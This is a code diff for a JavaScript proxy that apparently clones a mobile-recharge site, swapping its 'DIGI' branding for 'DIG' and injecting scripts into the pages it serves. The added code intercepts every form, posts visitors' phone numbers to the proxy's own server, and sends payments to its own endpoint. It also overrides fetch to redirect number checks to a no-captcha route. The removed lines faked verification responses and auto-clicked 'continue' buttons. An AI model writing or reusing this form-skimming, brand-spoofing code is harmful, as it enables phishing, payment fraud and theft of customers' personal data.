@@ -41,22 +41,25 @@ function replaceDigiWithDig(text) {
 
   let modifiedText = protectedText;
 
+  // Specific replacement for DIGDIG to DIG
+  modifiedText = modifiedText.replace(/DIGDIG/g, 'DIG');
+  modifiedText = modifiedText.replace(/Digdig/g, 'Dig');
+  modifiedText = modifiedText.replace(/digdig/g, 'dig');
+
+  // Original replacements
   const replacements = [
-    { pattern: /(^|\s|[^\w])(DIGI)(?=\s|$|[^\w])/g, replacement: '$1DIG$2' },
-    { pattern: /(^|\s|[^\w])(Digi)(?=\s|$|[^\w])/g, replacement: '$1Dig$2' },
-    { pattern: /(^|\s|[^\w])(digi)(?=\s|$|[^\w])/g, replacement: '$1dig$2' }
+    { pattern: /(^|\s|[^\w])(DIGI)(?=\s|$|[^\w])/g, replacement: '$1DIG' },
+    { pattern: /(^|\s|[^\w])(Digi)(?=\s|$|[^\w])/g, replacement: '$1Dig' },
+    { pattern: /(^|\s|[^\w])(digi)(?=\s|$|[^\w])/g, replacement: '$1dig' }
   ];
 
   for (const { pattern, replacement } of replacements) {
     modifiedText = modifiedText.replace(pattern, replacement);
   }
 
-  modifiedText = modifiedText.replace(/DIGI/gi, match => {
-    if (match === 'DIGI') return 'DIG';
-    if (match === 'Digi') return 'Dig';
-    if (match === 'digi') return 'dig';
-    return match;
-  });
+  modifiedText = modifiedText.replace(/DIGI/g, 'DIG');
+  modifiedText = modifiedText.replace(/Digi/g, 'Dig');
+  modifiedText = modifiedText.replace(/digi/g, 'dig');
 
   for (let i = protectedElements.length - 1; i >= 0; i--) {
     const { placeholder, content } = protectedElements[i];
@@ -116,51 +119,6 @@ async function modifyHTML(response) {
         }
       });
       
-      // Автоматичне проходження етапу перевірки номера
-      function autoProgressAfterCheckNumber() {
-        // Імітуємо кліки на кнопки "Далі" або "Продовжити" після завантаження сторінки
-        setTimeout(() => {
-          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
-            const text = el.innerText || el.value || '';
-            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
-                   el.classList.contains('btn-primary') || 
-                   el.classList.contains('btn-success');
-          });
-          
-          if (continueButtons.length > 0) {
-            console.log('Auto-continuing to next step');
-            continueButtons[0].click();
-          }
-        }, 500);
-      }
-
-      // Отримати вибрану суму з радіокнопок
-      function getSelectedAmountFromRadios() {
-        // Перевіряємо радіокнопки з name="recharge_number[amount]"
-        const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
-        if (selectedRadio) {
-          console.log('Found selected amount radio:', selectedRadio.value);
-          return selectedRadio.value;
-        }
-        
-        // Перевіряємо будь-які інші радіокнопки зі словом amount
-        const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
-        if (otherRadio) {
-          console.log('Found other amount radio:', otherRadio.value);
-          return otherRadio.value;
-        }
-        
-        // Якщо немає вибраних радіокнопок, перевіряємо data-amount
-        const amountEl = document.querySelector('[data-amount]');
-        if (amountEl) {
-          console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
-          return amountEl.getAttribute('data-amount');
-        }
-        
-        console.log('No amount radio found, using default 5');
-        return '5';
-      }
-
       window.processPayment = async function(amount, phoneNumber, sourceEvent) {
         if (sourceEvent) {
           sourceEvent.preventDefault();
@@ -178,30 +136,45 @@ async function modifyHTML(response) {
                 sessionStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                 localStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                 window.phoneNumberForPayment = phoneInput.value.replace(/\\D/g, '');
+                await fetch('/api/store-phone', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ phoneNumber: phoneInput.value.replace(/\\D/g, '') })
+                });
               } catch (e) { console.error('Error storing phone:', e); }
             }
             return true;
           }
           
-           if (!phoneNumber) {
-      try {
-        phoneNumber = window.phoneNumberForPayment || 
-                     sessionStorage.getItem('rechargePhoneNumber') || 
-                     localStorage.getItem('rechargePhoneNumber') || '';
-      } catch (e) { }
-      if (!phoneNumber) {
-        const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
-        phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
-      }
-    }
-          
-          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
-            amount = getSelectedAmountFromRadios() || '5';
+          // Extract phone number from span if available
+          let phoneSpan = document.querySelector('.form-group.phone span');
+          if (phoneSpan && phoneSpan.textContent && phoneSpan.textContent.match(/\\d{9}/)) {
+            phoneNumber = phoneSpan.textContent.trim();
+            console.log('Phone number found in span:', phoneNumber);
           }
           
-          console.log('Processing payment with amount:', amount, 'phone:', phoneNumber);
+          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+            try {
+              phoneNumber = window.phoneNumberForPayment || 
+                           sessionStorage.getItem('rechargePhoneNumber') || 
+                           localStorage.getItem('rechargePhoneNumber') || '';
+            } catch (e) { }
+            if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+              const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
+              phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
+            }
+          }
           
-            const response = await fetch('/.netlify/functions/api/create-payment', {
+          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+            alert('Error: Valid 9-digit phone number required');
+            return false;
+          }
+          
+          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
+            amount = document.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
+          }
+          
+          const response = await fetch('/api/create-payment', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
@@ -230,38 +203,19 @@ async function modifyHTML(response) {
       };
       
       document.addEventListener('DOMContentLoaded', function() {
-        // Автоматичний перехід до наступного етапу, якщо поточний URL містить "check_number"
-        if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
-          autoProgressAfterCheckNumber();
-        }
-        
-        // Перехоплюємо всі форми
         document.querySelectorAll('form').forEach(form => {
-          console.log('Form found:', form.id || form.name || 'unnamed form');
-          
           form.addEventListener('submit', function(event) {
-            console.log('Form submit intercepted:', form.id || form.name);
+            const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
+            const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
+            let phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
             
-            // Перевіряємо, чи це форма з вибором суми
-            const hasAmountRadios = form.querySelector('input[name="recharge_number[amount]"]');
-            if (hasAmountRadios) {
-              console.log('Form has amount radios');
-              const selectedAmount = getSelectedAmountFromRadios();
-              console.log('Selected amount:', selectedAmount);
-            
-              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
-              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
-              console.log('Phone from form:', phoneNumber);
-              
-              window.processPayment(selectedAmount, phoneNumber, event);
-              return false;
-            } else {
-              // Для інших форм
-              const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
-              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
-              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
-              window.processPayment(amount, phoneNumber, event);
+            // Check for phone span element
+            const phoneSpan = document.querySelector('.form-group.phone span');
+            if (phoneSpan && phoneSpan.textContent && phoneSpan.textContent.match(/\\d{9}/)) {
+              phoneNumber = phoneSpan.textContent.trim();
             }
+            
+            window.processPayment(amount, phoneNumber, event);
           });
         });
 
@@ -332,76 +286,11 @@ async function modifyJavaScript(response) {
     (function() {
       const origFetch = window.fetch;
       window.fetch = function(url, options) {
-        if (url && typeof url === 'string') {
-          // Автоматична відповідь для перевірки номера
-          if (url.includes('/api/check_number') || url.includes('/api/check-number')) {
-            return Promise.resolve(new Response(JSON.stringify({
-              code: 200,
-              data: {
-                id: Math.floor(Math.random() * 90000000) + 10000000,
-                charges: 0,
-                country: "spania",
-                number: ""
-              }
-            }), { 
-              status: 200, 
-              headers: { 'Content-Type': 'application/json' } 
-            }));
-          }
-          
-          // Для інших API запитів, які потрібно обробити автоматично
-          if (url.includes('/api/')) {
-            console.log('Intercepted API request:', url);
-          }
+        if (url && typeof url === 'string' && url.includes('/api/check_number')) {
+          url = url.replace('/api/check_number', '/api/check_number_no_captcha');
         }
         return origFetch.call(this, url, options);
       };
-    })();
-    
-    // Отримати вибрану суму з радіокнопок
-    function getSelectedAmountFromRadios() {
-      // Перевіряємо радіокнопки з name="recharge_number[amount]"
-      const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
-      if (selectedRadio) {
-        console.log('Found selected amount radio:', selectedRadio.value);
-        return selectedRadio.value;
-      }
-      
-      // Перевіряємо будь-які інші радіокнопки зі словом amount
-      const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
-      if (otherRadio) {
-        console.log('Found other amount radio:', otherRadio.value);
-        return otherRadio.value;
-      }
-      
-      // Якщо немає вибраних радіокнопок, перевіряємо data-amount
-      const amountEl = document.querySelector('[data-amount]');
-      if (amountEl) {
-        console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
-        return amountEl.getAttribute('data-amount');
-      }
-      
-      console.log('No amount radio found, using default 5');
-      return '5';
-    }
-    
-    // Автоматичний перехід до наступного кроку після перевірки номера
-    (function() {
-      if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
-        setTimeout(() => {
-          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
-            const text = el.innerText || el.value || '';
-            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
-                  el.classList.contains('btn-primary') || 
-                  el.classList.contains('btn-success');
-          });
-          
-          if (continueButtons.length > 0) {
-            console.log('Auto-continuing to next step');
-            continueButtons[0].click();
-          }
-        }, 500);
-      }
     })();
     
     (function() {
